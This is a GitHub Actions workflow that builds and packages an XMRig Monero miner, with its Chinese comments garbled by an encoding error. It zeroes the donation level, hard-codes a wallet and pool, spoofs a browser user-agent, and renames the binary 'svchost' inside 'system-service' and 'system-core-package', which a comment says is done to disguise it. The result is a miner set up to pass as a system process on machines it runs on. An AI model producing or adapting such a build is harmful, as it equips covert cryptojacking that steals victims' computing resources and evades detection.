# .github/workflows/build-miner.yml

name: Build and Package Miner

# è§¦å‘æ¡ä»¶ï¼š
# workflow_dispatch: å…è®¸åœ¨ GitHub Actions é¡µé¢æ‰‹åŠ¨è§¦å‘æ­¤å·¥ä½œæµ
on:
  workflow_dispatch:

jobs:
  build:
    name: Build for Linux (x64)
    runs-on: ubuntu-latest

    # å®šä¹‰ç¯å¢ƒå˜é‡ï¼Œç”¨äºä¼ªè£…ç›®å½•å’Œæ–‡ä»¶å
    env:
      DIR_NAME: system-service      # æºç å’Œæ„å»ºå°†è¢«æ”¾åœ¨è¿™ä¸ªç›®å½•åä¸‹
      EXE_NAME: svchost             # æœ€ç»ˆç¼–è¯‘å‡ºçš„å¯æ‰§è¡Œæ–‡ä»¶å
      WALLET_ADDR: 47Z5E787p8bHJEEc2Bf878K86LHQcbKT6f8KEsU7ocmnQPKHNbHHdMNc4dW6drrR4egpHmkM2jTWkP1tg4wymd7DAtJD37L # ä½ çš„é—¨ç½—å¸é’±åŒ…åœ°å€
      PACKAGE_NAME: system-core-package # å®šä¹‰æœ€ç»ˆå‹ç¼©åŒ…çš„åå­—

    steps:
    - name: 1. å®‰è£…ç¼–è¯‘æ‰€éœ€çš„ä¾èµ–ç¯å¢ƒ
      run: |
        sudo apt-get update
        sudo apt-get install -y git build-essential cmake automake libtool autoconf libuv1-dev libssl-dev libhwloc-dev

    - name: 2. ä¸‹è½½ XMRig-C3 æºç å¹¶é‡å‘½åç›®å½•
      run: git clone https://github.com/C3Pool/xmrig-C3.git ${{ env.DIR_NAME }}

    - name: 3. è‡ªåŠ¨ä¿®æ”¹æèµ çº§åˆ«ä¸º 0
      run: |
        sed -i 's/constexpr const int kDefaultDonateLevel =.*/constexpr const int kDefaultDonateLevel = 0;/g' ${{ env.DIR_NAME }}/src/donate.h
        sed -i 's/constexpr const int kMinimumDonateLevel =.*/constexpr const int kMinimumDonateLevel = 0;/g' ${{ env.DIR_NAME }}/src/donate.h
        echo "âœ… Donation level successfully set to 0."

    - name: 4. åˆ›å»º config.json é…ç½®æ–‡ä»¶
      run: |
        cat <<EOF > ./${{ env.DIR_NAME }}/src/config.json
        {
            "autosave": true,
            "cpu": {
                "enabled": true,
                "huge-pages": true,
                "hw-aes": null,
                "priority": null,
                "memory-pool": true,
                "yield": true,
                "asm": true,
                "max-threads-hint": 75
            },
            "randomx": {
                "init": -1,
                "mode": "auto",
                "1gb-pages": false,
                "rdmsr": true,
                "wrmsr": true,
                "numa": true
            },
            "pools": [
                {
                    "algo": null,
                    "coin": null,
                    "url": "auto.c3pool.org:19333",
                    "user": "${{ env.WALLET_ADDR }}",
                    "pass": "cloud-miner-01",
                    "keepalive": true,
                    "enabled": true,
                    "tls": true,
                    "tls-fingerprint": null
                }
            ],
            "log-file": null,
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
            "print-time": 300,
            "health-print-time": 300,
            "pause-on-battery": true
        }
        EOF
        echo "âœ… config.json created with your wallet address."

    - name: 5. æ‰§è¡Œé™æ€ç¼–è¯‘
      working-directory: ${{ env.DIR_NAME }}
      run: |
        echo "ğŸ“¦ Building static dependencies..."
        mkdir scripts/build && cd scripts/build
        cmake ../deps
        make -j$(nproc)
        cd ../../

        echo "ğŸš€ Compiling the main program..."
        mkdir build && cd build
        cmake .. -DXMRIG_DEPS=scripts/build
        make -j$(nproc)

    - name: 6. å‡†å¤‡æœ€ç»ˆæ‰“åŒ…ç›®å½•
      run: |
        mkdir -p final-package
        mv ${{ env.DIR_NAME }}/build/xmrig final-package/${{ env.EXE_NAME }}
        mv ${{ env.DIR_NAME }}/src/config.json final-package/config.json
        echo "âœ… Final package directory prepared."

    - name: 7. åˆ›å»º .tar.gz å‹ç¼©åŒ…
      run: |
        # ä½¿ç”¨ tar å‘½ä»¤åˆ›å»º .tar.gz æ ¼å¼çš„å‹ç¼©åŒ…
        # -C final-package/ : å…ˆåˆ‡æ¢åˆ° final-package ç›®å½•ï¼Œè¿™æ ·å‹ç¼©åŒ…å†…ä¸ä¼šåŒ…å«è¿™ä¸ªçˆ¶ç›®å½•
        # . : ä»£è¡¨å°†è¯¥ç›®å½•ä¸‹çš„æ‰€æœ‰å†…å®¹æ·»åŠ åˆ°å‹ç¼©åŒ…
        tar -czvf ${{ env.PACKAGE_NAME }}.tar.gz -C final-package/ .
        echo "âœ… Created ${{ env.PACKAGE_NAME }}.tar.gz"

    - name: 8. ä¸Šä¼ äº§ç‰©åŒ…
      uses: actions/upload-artifact@v4
      with:
        # ä¸Šä¼ åçš„åå­—
        name: ${{ env.PACKAGE_NAME }}
        # éœ€è¦ä¸Šä¼ çš„ .tar.gz æ–‡ä»¶
        path: ${{ env.PACKAGE_NAME }}.tar.gz
